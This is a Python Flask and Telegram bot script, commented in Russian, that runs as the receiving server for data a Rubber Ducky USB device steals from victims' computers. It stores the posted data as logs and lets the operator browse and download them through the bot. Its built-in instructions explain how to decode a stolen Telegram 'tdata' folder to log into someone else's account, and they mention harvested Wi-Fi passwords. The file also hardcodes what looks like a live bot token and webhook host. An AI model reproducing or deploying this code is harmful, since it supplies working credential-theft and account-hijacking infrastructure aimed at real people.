from flask import Flask, request, jsonify
import telebot
from telebot import types
import json
import os
from datetime import datetime

# ============================================================
# ТОКЕН
# ============================================================
TOKEN = "8687718580:AAE_uMnb9CrRBDER8cqi4f-xwzBrcfh_kQM"
bot = telebot.TeleBot(TOKEN)

app = Flask(__name__)

# ============================================================
# ПАПКА ДЛЯ ЛОГОВ
# ============================================================
LOG_DIR = "logs"
os.makedirs(LOG_DIR, exist_ok=True)

# ============================================================
# КЛАВИАТУРА
# ============================================================
def keyboard():
    kb = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
    kb.add(
        types.KeyboardButton("📊 Логи"),
        types.KeyboardButton("📥 Скачать"),
        types.KeyboardButton("📖 Инструкция"),
        types.KeyboardButton("🗑️ Очистить")
    )
    return kb

# ============================================================
# КОМАНДЫ БОТА
# ============================================================
@bot.message_handler(commands=['start'])
def start(m):
    bot.send_message(
        m.chat.id,
        "🪐 **DUCKY BOT**\n\n"
        "Я принимаю данные от Rubber Ducky.\n"
        "Просто отправь POST на `/grab`\n\n"
        "Выбери действие:",
        parse_mode='Markdown',
        reply_markup=keyboard()
    )

@bot.message_handler(func=lambda m: m.text == "📊 Логи")
def show_logs(m):
    files = get_logs()
    if not files:
        bot.send_message(m.chat.id, "📭 **Нет логов**", parse_mode='Markdown')
        return
    text = "📊 **Логи:**\n\n"
    for f in files[:10]:
        text += f"📄 `{f}`\n"
    bot.send_message(m.chat.id, text, parse_mode='Markdown')

@bot.message_handler(func=lambda m: m.text == "📥 Скачать")
def download_last(m):
    files = get_logs()
    if not files:
        bot.send_message(m.chat.id, "📭 **Нет файлов**", parse_mode='Markdown')
        return
    path = os.path.join(LOG_DIR, files[0])
    with open(path, 'rb') as f:
        bot.send_document(m.chat.id, f, caption=f"📄 {files[0]}")

@bot.message_handler(func=lambda m: m.text == "📖 Инструкция")
def instruction(m):
    text = """
📖 **КАК ВОЙТИ В ЧУЖОЙ TELEGRAM**

1. Rubber Ducky скопирует папку `tdata`
2. Найди в логах поле `telegram` — это Base64
3. Декодируй:
   `echo "строка" | base64 -d > tg.zip`
4. Распакуй архив
5. Замени свою папку:
   `%AppData%\\Telegram Desktop\\tdata`
6. Запусти Telegram — ты в чужом аккаунте!

🔑 **Wi-Fi пароли** тоже приходят — ищи поле `wifi`
"""
    bot.send_message(m.chat.id, text, parse_mode='Markdown')

@bot.message_handler(func=lambda m: m.text == "🗑️ Очистить")
def clear_all(m):
    for f in os.listdir(LOG_DIR):
        os.remove(os.path.join(LOG_DIR, f))
    bot.send_message(m.chat.id, "✅ **Все логи удалены**", parse_mode='Markdown')

# ============================================================
# ВСПОМОГАТЕЛЬНЫЕ
# ============================================================
def get_logs():
    files = [f for f in os.listdir(LOG_DIR) if f.endswith('.json')]
    return sorted(files, reverse=True)

# ============================================================
# FLASK — ПРИНИМАЕТ POST
# ============================================================
@app.route('/')
def index():
    return "🪐 Ducky Bot is running!"

@app.route('/grab', methods=['POST'])
def grab():
    try:
        data = request.get_json()
        if not data:
            data = {"raw": request.get_data(as_text=True)}

        name = f"{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        path = os.path.join(LOG_DIR, name)

        with open(path, 'w', encoding='utf-8') as f:
            json.dump(data, f, indent=2, ensure_ascii=False)

        print(f"[+] Saved: {name}")
        return jsonify({"status": "OK", "file": name}), 200

    except Exception as e:
        print(f"[-] Error: {e}")
        return jsonify({"error": str(e)}), 500

# ============================================================
# WEBHOOK — ПРИНИМАЕТ ОБНОВЛЕНИЯ ОТ TELEGRAM
# ============================================================
@app.route('/webhook', methods=['POST'])
def webhook():
    json_str = request.get_data().decode('UTF-8')
    update = telebot.types.Update.de_json(json_str)
    bot.process_new_updates([update])
    return "OK", 200

# ============================================================
# ЗАПУСК
# ============================================================
if __name__ == '__main__':
    # Устанавливаем webhook при старте
    webhook_url = "https://df-1-qkfy.onrender.com/webhook"
    bot.remove_webhook()
    bot.set_webhook(url=webhook_url)
    print(f"[+] Webhook set to: {webhook_url}")
    
    app.run(host='0.0.0.0', port=10000)
